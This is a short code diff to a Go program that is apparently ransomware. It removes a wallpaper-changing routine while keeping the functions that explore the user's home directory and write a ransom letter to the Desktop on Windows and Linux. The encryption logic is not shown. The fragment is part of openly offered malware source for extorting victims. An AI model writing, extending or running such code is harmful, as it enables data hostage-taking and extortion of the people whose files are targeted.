@@ -11,20 +11,8 @@ import (
 	"path/filepath"
 	"runtime"
 	"strings"
-
-	"github.com/reujab/wallpaper"
 	// "log" // uncomment this line and the log.Fatal() debug lines inside the code, if needed :)
 )
-
-func change_wallpaper() {
-	var wallpaperPath string = "./wallpaper.jpg"
-	err := wallpaper.SetFromFile(wallpaperPath)
-	if err != nil {
-		// log.Fatal(err)
-	} else {
-		// wallpaper changed successfully
-	}
-}
 
 func create_ransom_letter(ransom_letter_path string, op_sys string) {
 	// ransom letter content
@@ -166,8 +154,6 @@ func osWindows() {
 
 	explore_directory(user_dir)
 
-	change_wallpaper()
-
 	var file_path string = filepath.Join(user_dir, "/Desktop")
 	create_ransom_letter(file_path, "windows")
 }
@@ -181,8 +167,6 @@ func osLinux() {
 	// if _, err := os.Stat(home_dir); os.IsNotExist(err) { log.Fatalf("Directory %s doesn't exist: ", home_dir) }
 
 	explore_directory(home_dir)
-
-	change_wallpaper()
 
 	var file_path string = filepath.Join(home_dir, "Desktop")
 	create_ransom_letter(file_path, "linux")
